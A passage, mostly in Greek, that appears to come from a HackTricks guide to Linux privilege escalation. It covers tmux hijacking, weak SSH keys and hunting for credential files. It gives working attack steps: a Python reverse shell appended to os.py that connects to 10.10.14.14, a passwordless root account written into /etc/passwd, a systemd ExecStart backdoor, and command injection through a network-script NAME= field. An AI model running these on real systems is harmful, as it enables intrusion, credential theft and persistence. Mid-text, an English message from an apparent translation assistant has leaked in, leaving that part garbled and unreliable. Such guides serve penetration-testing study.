tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Δες το **Valentine box από το HTB** για παράδειγμα.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH keys που δημιουργήθηκαν σε συστήματα βασισμένα σε Debian (Ubuntu, Kubuntu, κτλ.) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 ενδέχεται να επηρεάστηκαν από αυτό το bug.\
Αυτό το bug προκαλείται κατά τη δημιουργία νέου ssh key σε αυτά τα OS, καθώς **υπήρχαν μόνο 32.768 πιθανές παραλλαγές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείτε να ψάξετε για το αντίστοιχο private key**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Ενδιαφέρουσες τιμές διαμόρφωσης

- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται password authentication. Η προεπιλεγμένη τιμή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται public key authentication. Η προεπιλεγμένη τιμή είναι `yes`.
- **PermitEmptyPasswords**: Όταν το password authentication είναι επιτρεπτό, καθορίζει αν ο server επιτρέπει σύνδεση σε λογαριασμούς με κενές συμβολοσειρές password. Η προεπιλεγμένη τιμή είναι `no`.

### PermitRootLogin

Καθορίζει αν ο root μπορεί να κάνει login μέσω ssh, προεπιλογή `no`. Δυνατές τιμές:

- `yes`: ο root μπορεί να κάνει login χρησιμοποιώντας password και private key
- `without-password` ή `prohibit-password`: ο root μπορεί να συνδεθεί μόνο με private key
- `forced-commands-only`: ο root μπορεί να συνδεθεί μόνο με private key και εφόσον έχουν οριστεί οι επιλογές commands
- `no`: όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν public keys που μπορούν να χρησιμοποιηθούν για user authentication. Μπορεί να περιέχει tokens όπως `%h`, που θα αντικατασταθούν με το home directory. **Μπορείτε να δηλώσετε απόλυτες διαδρομές** (που ξεκινούν με `/`) ή **σχετικές διαδρομές από το home του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η διαμόρφωση θα υποδείξει ότι αν προσπαθήσεις να συνδεθείς με το **private** key του χρήστη "**testusername**", το ssh θα συγκρίνει το public key του κλειδιού σου με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Το SSH agent forwarding σάς επιτρέπει να **χρησιμοποιείτε τα τοπικά SSH keys αντί να αφήνετε keys** (without passphrases!) στον server σας. Έτσι, θα μπορείτε να **jump** μέσω ssh **σε έναν host** και από εκεί να **jump σε άλλον** host **χρησιμοποιώντας** το **key** που βρίσκεται στο **initial host**.

Πρέπει να ρυθμίσεις αυτή την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν `Host` είναι `*`, κάθε φορά που ο χρήστης μεταφέρεται σε άλλη μηχανή, εκείνος ο host θα μπορεί να αποκτήσει πρόσβαση στα keys (που αποτελεί πρόβλημα ασφάλειας).

Το αρχείο `/etc/ssh_config` μπορεί να **αντικαταστήσει** αυτές τις **επιλογές** και να επιτρέψει ή να αρνηθεί αυτή τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **αρνηθεί** το ssh-agent forwarding με το keyword `AllowAgentForwarding` (default is allow).

Αν διαπιστώσετε ότι το Forward Agent είναι διαμορφωμένο σε ένα περιβάλλον, διαβάστε την παρακάτω σελίδα καθώς **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ενδιαφέροντα Αρχεία

### Αρχεία προφίλ

Το αρχείο `/etc/profile` και τα αρχεία κάτω από `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Εάν βρεθεί κάποιο περίεργο profile script, θα πρέπει να το ελέγξετε για **ευαίσθητες πληροφορίες**.

### Αρχεία Passwd/Shadow

Ανάλογα με το λειτουργικό σύστημα, τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να έχουν διαφορετικό όνομα ή να υπάρχει αντίγραφο ασφαλείας. Επομένως συνιστάται να **τα βρείτε όλα** και να **ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο `/etc/passwd` (ή στο αντίστοιχο) αρχείο
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Πρώτα, δημιούργησε ένα password με μία από τις παρακάτω εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md content to translate yet. Please paste the file (or the sections you want translated). 

Also clarify how you want the "hacker" user added in the translated file:
- Do you want me to generate a password for you and insert it in the markdown? If yes, specify password length and allowed characters (e.g., 16 chars, letters+digits+symbols).
- Or do you want a placeholder like `<GENERATED_PASSWORD>` so you can replace it later?

Note: I can modify the markdown to show the user and password text, but I cannot run commands or create the user on your system.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείτε τώρα να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν dummy χρήστη χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: ενδέχεται να μειώσετε την τρέχουσα ασφάλεια της μηχανής.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Σε πλατφόρμες BSD το `/etc/passwd` βρίσκεται στα `/etc/pwd.db` και `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάστηκε σε `/etc/spwd.db`.

Πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο διαμόρφωσης υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν η μηχανή τρέχει έναν **tomcat** server και μπορείτε να **τροποποιήσετε το αρχείο ρυθμίσεων της υπηρεσίας Tomcat μέσα στο /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει το tomcat.

### Έλεγχος Φακέλων

Οι ακόλουθοι φάκελοι μπορεί να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορέσετε να διαβάσετε τον τελευταίο αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Περίεργη τοποθεσία/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Αρχεία που τροποποιήθηκαν τα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB αρχεία
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ψάχνει για **πολλαπλά πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
**Ένα ακόμη ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε για αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης αποθηκευμένων σε τοπικό υπολογιστή για Windows, Linux & Mac.

### Αρχεία καταγραφής

Εάν μπορείτε να διαβάσετε αρχεία καταγραφής, ίσως να καταφέρετε να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο περίεργο είναι το αρχείο καταγραφής, τόσο πιο ενδιαφέρον θα είναι (πιθανώς).\
Επίσης, κάποια "**κακώς**" ρυθμισμένα (backdoored?) **αρχεία ελέγχου** μπορεί να σας επιτρέψουν να **καταγράψετε κωδικούς πρόσβασης** μέσα στα αρχεία ελέγχου όπως εξηγείται σε αυτό το άρθρο: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε τα logs, η ομάδα** [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα είναι πολύ χρήσιμη.

### Shell αρχεία
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Γενική Αναζήτηση Creds/Regex

Θα πρέπει επίσης να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομα** τους ή μέσα στο **περιεχόμενο**, και επίσης να ελέγξετε για IPs και emails μέσα σε logs, ή regexps για hashes.\
Δεν θα απαριθμήσω εδώ πώς να κάνετε όλα αυτά αλλά αν ενδιαφέρεστε μπορείτε να ελέγξετε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

Αν γνωρίζετε από **πού** θα εκτελεστεί ένα python script και **μπορείτε να γράψετε μέσα** σε αυτόν τον φάκελο ή μπορείτε να **τροποποιήσετε python libraries**, μπορείτε να τροποποιήσετε τη βιβλιοθήκη os και να την backdoor (αν μπορείτε να γράψετε εκεί που θα εκτελεστεί το python script, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να **backdoor the library** απλά προσθέστε στο τέλος της βιβλιοθήκης os.py την παρακάτω γραμμή (αλλάξτε IP και PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση του logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **write permissions** σε ένα αρχείο καταγραφής ή στους γονικούς καταλόγους του να αποκτήσουν ενδεχομένως αυξημένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά εκτελείται ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο στο _/var/log_ αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται log rotation.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει την έκδοση `logrotate` `3.18.0` και παλαιότερες

Περισσότερες λεπτομέρειες για την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** οπότε κάθε φορά που βρίσκετε ότι μπορείτε να αλλάξετε logs, ελέγξτε ποιος τα διαχειρίζεται και δείτε αν μπορείτε να ανεβάσετε προνόμια αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημείωση: το κενό διάστημα μεταξύ Network και /bin/id_)

### **init, init.d, systemd, and rc.d**

Ο κατάλογος `/etc/init.d` φιλοξενεί **scripts** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών του Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart`, και μερικές φορές `reload` υπηρεσίες. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Μια εναλλακτική διαδρομή σε συστήματα Redhat είναι η `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` σχετίζεται με το **Upstart**, ένα νεότερο **service management** που εισήγαγε η Ubuntu, χρησιμοποιώντας αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση σε Upstart, τα SysVinit scripts εξακολουθούν να χρησιμοποιούνται παράλληλα με τις ρυθμίσεις Upstart λόγω ενός compatibility layer στο Upstart.

Το **systemd** αναδύεται ως ένας σύγχρονος μηχανισμός εκκίνησης και service manager, προσφέροντας προηγμένα χαρακτηριστικά όπως on-demand daemon starting, automount management, και system state snapshots. Οργανώνει αρχεία σε `/usr/lib/systemd/` για distribution packages και `/etc/systemd/system/` για τροποποιήσεις διαχειριστή, απλοποιώντας τη διαχείριση του συστήματος.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συνήθως κάνουν hook σε ένα syscall για να εκθέσουν privileged kernel functionality σε έναν userspace manager. Αδύναμη authentication του manager (π.χ. signature checks βασισμένες στο FD-order ή φτωχά password schemes) μπορεί να επιτρέψει σε μια local app να impersonate τον manager και να escalate to root σε συσκευές που είναι ήδη rooted. Μάθετε περισσότερα και λεπτομέρειες εκμετάλλευσης εδώ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Καλύτερο εργαλείο για αναζήτηση Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
